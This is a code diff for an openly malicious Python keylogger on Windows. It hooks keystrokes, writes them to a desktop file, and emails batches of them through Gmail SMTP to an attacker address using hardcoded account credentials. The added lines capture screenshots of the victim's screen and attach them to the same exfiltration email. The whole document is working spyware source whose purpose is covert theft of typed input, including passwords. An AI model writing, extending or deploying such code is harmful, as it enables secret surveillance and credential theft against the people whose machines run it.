@@ -1,20 +1,35 @@
-import pyHook,pythoncom
+import pyHook,pythoncom,sys
 import smtplib
 from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+from email import encoders
 import getpass
+import autopy
 
 file_log = open('C:\\Users\\wembl\\Desktop\\keys.txt','w+')
 buffer = file_log.read()
 file_log.close()
+user = getpass.getuser()
+
+def screenCapture():
+    bitmap = autopy.bitmap.capture_screen()
+    bitmap.save('C:\\Users\\wembl\\Desktop\\screenshot_of_'+ user+'.png')
 
 def sendEmail(keyMessage):
     try:
-        user = getpass.getuser()
+        attachment = open('C:\\Users\\wembl\\Desktop\\screenshot_of_'+ user+'.png','rb')
+        part = MIMEBase('application','octet-stream')
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition',"attachment;filename= "+file_log)
         fromaddr = 'keyhunter.hackspc@gmail.com'
         username = 'hackdemdead@gmail.com'
         password = 'leonardo19'
         keyMessage += "<br><br>" + "Keys have been logged master"
-        msg = MIMEText(keyMessage,'html')
+        msg = MIMEMultipart()
+        msg.attach(part)
+        msg.attach(MIMEText(keyMessage,'html'))
         msg['Subject'] = "Keys Logged From User: " + user
         msg['Reply-to'] = 'no-reply'
         msg['To'] = 'hackdemdead@gmail.com'
@@ -35,6 +50,8 @@ def OnKeyboardEvent(event):
     file_log.close()
     if len(buffer) > 500:
         sendEmail(buffer[-1000:].replace("\n", "<br>"))
+        screenCapture()
+        sys.exit
 
     file_log = open('C:\\Users\\wembl\\Desktop\\keys.txt',  'w')
     keylogs = chr(event.Ascii)
